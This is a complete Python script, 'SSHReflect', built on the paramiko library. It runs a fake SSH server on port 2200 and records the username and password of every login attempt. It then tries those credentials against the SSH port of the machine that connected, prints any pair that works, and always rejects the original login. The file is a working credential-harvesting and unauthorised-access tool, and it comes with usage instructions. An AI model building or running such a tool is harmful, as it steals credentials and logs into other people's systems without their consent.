import base64
from binascii import hexlify
import os
import socket
import sys
import threading
import traceback

import paramiko
from paramiko.py3compat import b, u, decodebytes

class Server (paramiko.ServerInterface):

	addr=''

	def __init__(self,addr):
		self.event = threading.Event()
		self.addr=addr

	def check_auth_password(self, user, password):

		goodpass=1

		try:
			client = paramiko.SSHClient()
			client.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
			client.connect(self.addr, 22, user, password)
		except Exception as e:
			goodpass=0

		if goodpass==1:
			print(self.addr+':'+user+':'+password)

		client.close()

		return paramiko.AUTH_FAILED
	def get_allowed_auths(self, username):
		return 'password' 
	
print('# _____ _____ _   _ ______      __ _           _   \n'+
'#/  ___/  ___| | | || ___ \    / _| |         | |  \n'+
'#\ `--.\ `--.| |_| || |_/ /___| |_| | ___  ___| |_ \n'+
'# `--. \`--. \  _  ||    // _ \  _| |/ _ \/ __| __|\n'+
'#/\__/ /\__/ / | | || |\ \  __/ | | |  __/ (__| |_ \n'+
'#\____/\____/\_| |_/\_| \_\___|_| |_|\___|\___|\__|\n'+
'#                                                  \n'+
'#                                                  \n'+
'#'+sys.argv[0]+' by animanegra\n#')

if len(sys.argv)==2:

	DoGSSAPIKeyExchange = False

	host_key=None

	try:

		host_key = paramiko.RSAKey(filename=sys.argv[1])

	except IOError:

		print('File does not contains a valid rsa key')

	if host_key==None:

		exit

	else:

		try:

			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			sock.bind(('', 2200))

		except Exception as e:

			print('failed: ' + str(e))
			exit

		try:

			while 1==1:

				try:

					sock.listen(100)
					client, addr = sock.accept()

				except Exception as e:

					print('failed: ' + str(e))
					exit

				try:

					ssh = paramiko.Transport(client, gss_kex=DoGSSAPIKeyExchange)
					ssh.set_gss_host(socket.getfqdn(""))

					ssh.add_server_key(host_key)

					server = Server(addr[0])

					try:

						ssh.start_server(server=server)

					except paramiko.SSHException:

						print('Error: Bad negotiation.')
						exit

					chan = ssh.accept(20)

				except Exception as e:
					print('Problem detected.')
					exit

		except:

			exit

else:

	print('#'+sys.argv[0] + ': An SSH reflecting service.')
	print('#')
	print('#Ussage: ' + sys.argv[0] + ' RSA_key_file ')
	print('#	RSA_key_file:	path to rsa key file.')
	print('#			to generate file just execute from shell:')
	print('#				ssh-keygen -t rsa -N "" -f RSA_key_file')
